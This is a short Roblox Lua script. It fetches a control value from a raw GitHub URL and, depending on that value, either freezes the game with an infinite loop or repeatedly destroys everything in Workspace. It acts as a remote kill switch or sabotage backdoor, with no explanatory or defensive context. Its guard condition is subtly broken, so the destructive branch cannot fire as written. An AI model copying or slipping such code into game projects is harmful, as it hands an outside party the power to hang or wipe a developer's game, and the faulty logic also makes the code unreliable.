local isWorking = game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/lePro7483/Roblox/main/FunnyStuff/Funny.lua")
repeat task.wait(.06) until game:IsLoaded()

if not isWorking == "FF" then
	if isWorking == "TF" then
		while true do end
	else
		while true do
			for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
				v:Destroy()
			end
		end
	end
end
